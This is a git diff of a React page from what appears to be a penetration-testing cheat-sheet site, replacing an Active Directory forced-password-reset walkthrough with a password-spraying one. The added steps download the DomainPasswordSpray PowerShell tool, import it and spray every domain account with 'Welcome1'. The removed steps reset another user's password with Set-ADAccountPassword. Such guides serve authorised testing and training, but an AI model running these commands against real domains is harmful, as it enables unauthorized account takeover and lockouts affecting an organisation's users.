@@ -4,17 +4,17 @@ import {
   AccordionSummary,
   AccordionDetails,
   Box,
+  Divider,
 } from "@mui/material";
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const ForceChangePassword = ({ title }: IProps) => {
+const PasswordSprayingPE = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -36,43 +36,32 @@ const ForceChangePassword = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              The members of the compromised group have the capability to change
-              the user's password in the other group without knowing that user's
-              current password.
+              Once we obtain a list of valid users, we can password spray with a
+              common password to try and login.
             </Typography>
-            <Image
-              src="/ForceChangePassword.png"
-              width={575}
-              height={154}
-              priority={true}
-            />
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 1</Typography>
+            <Typography variant="h6">Step 1 - Windows</Typography>
             <Typography>
-              If you have ForceChangePassword over a group then you can get a
-              list of user's in that group and choose which user we want to
-              change the password for. If you have ForceChangePassword over a
-              user, then skip to step 2.
+              Get the DomainPasswordSpray tool below. If we are authenticated to
+              the domain, the tool will automatically generate a user list from
+              Active Directory, query the domain password policy, and exclude
+              user accounts within one attempt of locking out.
             </Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {'Get-ADGroupMember -Identity "OTHER_GROUP_NAME"'}
-            </SyntaxHighlighter>
-            <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 2</Typography>
-            <Typography>Create a new password variable.</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
+                "wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"
               }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 3</Typography>
-            <Typography>
-              Change one of the user's passwords to the password you created.
-            </Typography>
+            <Typography variant="h6">Step 2 - Windows</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"Import-Module .\\DomainPasswordSpray.ps1"}
+            </SyntaxHighlighter>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 3 - Windows</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
+                "Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue"
               }
             </SyntaxHighlighter>
           </Typography>
@@ -82,4 +71,4 @@ const ForceChangePassword = ({ title }: IProps) => {
   );
 };
 
-export default ForceChangePassword;
+export default PasswordSprayingPE;
